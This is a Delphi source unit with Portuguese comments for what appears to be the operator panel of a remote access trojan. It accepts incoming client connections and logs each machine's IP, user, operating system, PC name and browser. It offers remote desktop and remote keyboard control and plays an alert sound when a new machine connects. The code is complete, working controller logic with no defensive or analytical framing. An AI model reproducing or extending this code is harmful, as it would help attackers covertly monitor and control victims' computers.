unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls,zLibEx,  StreamManager, ScktComp,
  Menus, MMSystem, MPlayer;

   type
  TSock_Thread = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TSock_Thread2 = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TForm1 = class(TForm)
    Panel1: TPanel;
    Button1: TButton;
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Label3: TLabel;
    Panel2: TPanel;
    LV1: TListView;
    SS1: TServerSocket;
    PopupMenu1: TPopupMenu;
    AcessarComputadorDesktopRemoto1: TMenuItem;
    N1: TMenuItem;
    Finalizar1: TMenuItem;
    Timer1: TTimer;
    Edit2: TEdit;
    Button2: TButton;
    Label4: TLabel;
    OpenDialog1: TOpenDialog;
    MediaPlayer1: TMediaPlayer;
    procedure Button1Click(Sender: TObject);
    procedure SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure AcessarComputadorDesktopRemoto1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Finalizar1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure SS1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
  private
    { Private declarations }
  public

  L:TListItem;

    { Public declarations }
  end;

var
  Form1: TForm1;



implementation
 Uses Unit2, Unit3;


Constructor TSock_Thread.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread2.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;


{$R *.dfm}


// Descomprime dados
function DeCompressStream(SrcStream: TMemoryStream): boolean;
var
  InputStream, OutputStream: TMemoryStream;
  inbuffer, outbuffer: Pointer;
  count, outcount: longint;
begin
  result := false;
  if not assigned(SrcStream) then
    exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := InputStream.Size;
    getmem(inbuffer, count);
    InputStream.ReadBuffer(inbuffer^, count);
    zdecompress(inbuffer, count, outbuffer, outcount);
    OutputStream.Write(outbuffer^, outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result := true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

// Descomprime dados
procedure ExpandStream(inStream, outStream: TStream);
const
  BufferSize = 4096;
var
  count: Integer;
  ZStream: TZDecompressionStream;
  Buffer: array [0 .. BufferSize - 1] of Byte;
begin
  ZStream := TZDecompressionStream.Create(inStream);
  try
    while true do
    begin
      count := ZStream.Read(Buffer, BufferSize);
      if count <> 0 then
        outStream.WriteBuffer(Buffer, count)
      else
        Break;
    end;
  finally
    ZStream.Free;
  end;
end;



// Thread principal, onde será definido onde a conexão será de informações, Desktop Remoto, Teclado Remoto, Baixar e Enviar arquivos.
procedure TSock_Thread.Execute;
var
  s, s2: String;
  L: TListItem;
  TSTPrincipal: TSock_Thread2;
  Desktop: TForm2;
begin
  inherited;

  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;

      if Pos('<|PRINCIPAL|>', s) > 0 then
      begin
        TSTPrincipal := TSock_Thread2.Create(Socket);
        TSTPrincipal.Resume;
        Socket.SendText('<|OK|>');
        Destroy;
      end;

      if Pos('<|Desktop|>', s) > 0 then
      begin
        Form1.LV1.Selected.SubItems.Objects[1] := TObject(Socket);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto :=
          TRemoto.Create(true);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Socket
          := Socket;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Resume;
        Destroy;
      end;
  {
       if Pos('<|NAVEGADOR|>', s) > 0 then
      begin
        Form1.LV1.Selected.SubItems.Objects[1] := TObject(Socket);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto :=
          TRemoto.Create(true);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Socket
          := Socket;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Resume;
        Destroy;
      end;  }

    if Pos('<|KEYBOARD|>', s) > 0 then
      begin
        s2 := s;
        Delete(s2, 1, Pos('<|KEYBOARD|>', s2) + 11);

        s2 := Copy(s2, 1, Pos('<<|', s2) - 1);
        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
          (L.SubItems.Objects[2] as TForm2).Socket2 := Socket;
        Destroy;
      end;

    end;
    Sleep(10);
  end;
end;

     procedure TSock_Thread2.Execute;
var
  s, s2, iden, SO,pc, nave: String;
  L, L2: TListItem;
begin
  inherited;

  Socket.SendText('<|SocketMain|>' + intToStr(Socket.Handle) + '<<|');
  while not Terminated and Socket.Connected do
  begin
    if Socket.ReceiveLength > 0 then
    begin
      s := Socket.ReceiveText;

      if Pos('<|Info|>', s) > 0 then
      begin
        s2 := s;

        Delete(s2, 1, Pos('<|Info|>', s2) + 7);
        iden := Copy(s2, 1, Pos('<|>', s2) - 1);

         Delete(s2, 1, Pos('<|>', s2) + 2);
         SO := Copy(s2, 1, Pos('<|>', s2) - 1);

         Delete(s2, 1, Pos('<|>', s2) + 2);
         pc := Copy(s2, 1, Pos('<|>', s2) - 1);

         Delete(s2, 1, Pos('<|>', s2) + 2);
         nave := Copy(s2, 1, Pos('<<|', s2) - 1);

          L := Form1.LV1.Items.Add;
          L.Caption := intToStr(Socket.Handle);  //aqui vai receber o ID
          L.SubItems.Add(Socket.RemoteAddress); //aqui vai receber o ip
          L.SubItems.Add(Socket.RemoteHost);  //aqui vai receber o Usuario
          L.SubItems.Add(iden);           //aqui vai reberber o Sistema Operacional dela
          L.SubItems.Add(pc);
          L.SubItems.Add(Nave);

          L.SubItems.Add(SO);
          L.SubItems.Objects[0] := TObject(Socket);
      
      end;

      
      if copy(s,1,4) = 'info' then
        begin
         delete(s,1,4);
         FOrm3.Memo1.Lines.Add(S);
       end;


    end;
    Sleep(10); // vai impedir que o cpu cheque a 100%
  end;
end;




procedure TForm1.Button1Click(Sender: TObject);
begin
  if Button1.Caption = 'Start Operador' then
  begin
    LV1.Enabled := true;
    Button1.Caption := 'Stop Operador';
    SS1.Port := strToInt(Edit1.Text);
    SS1.Active := true;
    Edit1.Enabled := false;
    end
  else
  begin
    LV1.Enabled := false;
    Button1.Caption := 'Start Operador';
    SS1.Active := false;
    LV1.Clear;
    Edit1.Enabled := true;

  end;

end;

procedure TForm1.SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;
begin
  TST := TSock_Thread.Create(Socket);
  TST.Resume;

end;

procedure TForm1.SS1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
     if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
      (L.SubItems.Objects[2] as TForm2).Close;
      end;

    end;
    L.Delete;
  end;

end;

procedure TForm1.SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (L.SubItems.Objects[2] as TForm2).Socket then
      begin
        (L.SubItems.Objects[2] as TForm2).Close;
     end;
     end;
    L.Delete;
  end;

end;

procedure TForm1.AcessarComputadorDesktopRemoto1Click(Sender: TObject);
var
  Desktop: TForm2;
  Socket: TCustomWinSocket;
begin
  if LV1.ItemIndex < 0 then
    exit;

  if LV1.Selected.SubItems.Objects[2] = nil then
  begin
    Desktop := TForm2.Create(self);
    LV1.Selected.SubItems.Objects[2] := TObject(Desktop);
    Desktop.Caption := 'Operador  - Desktop Remoto de "' +
      LV1.Selected.SubItems[0] + '"';
    Desktop.Show;
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    Desktop.Socket := Socket;
    Socket.SendText('<|first|>');
  end
  else if (LV1.Selected.SubItems.Objects[2] as TForm2).Visible = false then
  begin
    Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket := Socket;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Show;
    (LV1.Selected.SubItems.Objects[2] as TForm2).Socket.SendText('<|first|>');
  end

end;



procedure TForm1.Timer1Timer(Sender: TObject);
begin
Label3.Caption := IntToStr(lv1.Items.Count);
end;

procedure TForm1.Finalizar1Click(Sender: TObject);
begin
SS1.Socket.SendText('CLOSE');
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
if opendialog1.Execute then
 begin
   Edit2.Text := opendialog1.FileName;

  MediaPlayer1.FileName := Edit2.Text;

 end;

 end;


procedure TForm1.SS1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
Mediaplayer1.Open;
Mediaplayer1.Play;

end;

end.
